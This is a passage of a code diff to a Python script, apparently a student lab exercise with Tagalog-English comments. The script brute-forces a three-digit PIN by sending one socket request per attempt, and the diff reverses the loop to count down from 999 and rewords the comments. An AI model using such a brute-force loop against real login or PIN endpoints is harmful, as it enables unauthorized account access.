@@ -30,13 +30,13 @@ def send_request(request):
         ''' 
         infinite loop to receive 4000 bytes of data
         basically, it starts from chunk = 0, then if the condition is not satisfied it 
-        iterates, so the next value will be chunk = 1
+        increments, so the next value will be chunk = 1, then it will iterate
         '''
         while True:
             chunk = sock.recv(4096) # the data received
             if not chunk: # condition that breaks out of the loop if there no more data or response from the server
                 break
-            response += chunk # pang iterate and store to container, literal meaning is response = response + chunk
+            response += chunk # pang increment and store to container, literal meaning is response = response + chunk
         sock.close() # close connection :D
 
 
@@ -56,7 +56,7 @@ def send_request(request):
 # FUNCTION-  main function, this is the first function to run, this initializes the other functions and their parameters
             #the requests functions are called here
 def main():
-    for pin in range(1000): # The loop for the continuous attempts (starts with 0 - 999)
+    for pin in range(999, -1, -1): # The loop for the continuous attempts (starts with 999 decrements to 0)
         request, pin_str = create_request(pin) # This is the variable that gives the PIN number for each attempts to the create_request function
         response = send_request(request) # Sends request and receives the server reply for each attempts
         if response:
